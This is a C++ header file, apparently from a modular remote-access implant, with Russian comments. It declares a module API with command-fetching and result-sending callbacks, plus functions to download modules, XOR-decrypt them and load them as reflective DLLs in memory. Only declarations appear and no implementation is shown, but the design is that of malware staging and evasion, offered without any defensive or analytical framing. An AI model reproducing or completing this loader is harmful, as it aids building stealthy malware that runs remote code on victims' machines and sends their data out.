// Core/loader.h
#pragma once
#include <windows.h>
#include <vector>
#include <string>

// 🔑 КРИТИЧНО: Структура должна совпадать с filemgr.h
struct ModuleAPI {
    void (*send_result)(const unsigned char* data, unsigned long long len);
    void (*log)(const char* msg);
    const char* (*get_command)(const char* key);
};

// Функции
bool download_module(const std::string& name, std::vector<uint8_t>& out_data);
bool load_reflective_dll(const std::vector<uint8_t>& dll_data, void*& module_base);
bool execute_module(void* module_base, const ModuleAPI& api);
void xor_decrypt(std::vector<uint8_t>& data, uint8_t key = 0xAA);